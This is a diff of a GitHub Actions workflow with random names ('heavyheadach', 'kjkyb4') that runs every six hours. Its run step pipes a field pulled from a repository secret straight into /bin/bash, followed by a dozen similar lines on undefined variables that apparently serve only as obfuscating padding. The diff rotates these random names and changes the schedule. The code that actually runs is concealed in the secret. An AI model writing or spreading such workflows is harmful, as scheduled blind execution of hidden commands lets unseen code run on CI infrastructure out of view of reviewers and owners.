@@ -1,29 +1,30 @@
 name: heavyheadach
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
+    - cron: '40 4/6 * * *'
 
-jobs:  # 27392
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heavyheadach
         env:
-          vjlbn2246: ${{ secrets.vjlbn2246 }}
+          kjkyb4: ${{ secrets.kjkyb4 }}
         run: |
-          echo $vjlbn2246 | jq -r .qjkjl41 | /bin/bash
-          echo $gpq43 | jq -r .smwp404 | /bin/bash
-          echo $jjkr52 | jq -r .so91 | /bin/bash
-          echo $a3 | jq -r .i864 | /bin/bash
-          echo $wi71 | jq -r .l6 | /bin/bash
-          echo $eldxx77983 | jq -r .qhbxy6 | /bin/bash
-          echo $ir97 | jq -r .mq67454 | /bin/bash
-          echo $x91811 | jq -r .di81 | /bin/bash
-          echo $hn4435 | jq -r .x626 | /bin/bash
-          echo $ni637 | jq -r .n29736 | /bin/bash
-          echo $hh96838 | jq -r .kni099 | /bin/bash
-          echo $nyi2154 | jq -r .xzb9767 | /bin/bash
+          echo $kjkyb4 | jq -r .aay997 | /bin/bash
+          echo $zfq2 | jq -r .hh15 | /bin/bash
+          echo $jw6285 | jq -r .a2057 | /bin/bash
+          echo $iy41 | jq -r .gjwl5 | /bin/bash
+          echo $wuia6 | jq -r .tpf32 | /bin/bash
+          echo $pksbg6254 | jq -r .zkrwo05876 | /bin/bash
+          echo $zcnrp1068 | jq -r .kens7816 | /bin/bash
+          echo $rqaw936 | jq -r .fweg2 | /bin/bash
+          echo $m74074 | jq -r .zl282 | /bin/bash
+          echo $ouz5497 | jq -r .xvbka33 | /bin/bash
+          echo $db17 | jq -r .orhq946 | /bin/bash
+          echo $xkm32 | jq -r .p6 | /bin/bash
+          echo $vo0458 | jq -r .wenxj2 | /bin/bash
 
